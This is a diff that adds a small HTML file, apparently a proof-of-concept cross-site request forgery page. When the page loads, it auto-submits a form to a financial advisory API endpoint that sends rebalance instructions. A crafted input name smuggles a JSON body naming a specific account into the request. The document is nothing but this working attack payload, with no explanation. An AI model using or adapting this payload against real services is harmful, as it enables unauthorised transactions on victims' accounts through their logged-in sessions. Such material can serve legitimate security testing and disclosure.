@@ -1,0 +1,8 @@
+<html>
+  <body onload="document.getElementById('csrf').submit()">
+          <form id=csrf action=https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions method=POST enctype="application/json">
+		          <input name='{"targetType":"Account","selectedAccounts":[{"accountNumber":"34850352705204","custodian":"FID","accountSource":"FPRS"}],"newRequest":true,"fsake":"' value='"}' >
+	      </form>
+		  
+  </body>
+</html>
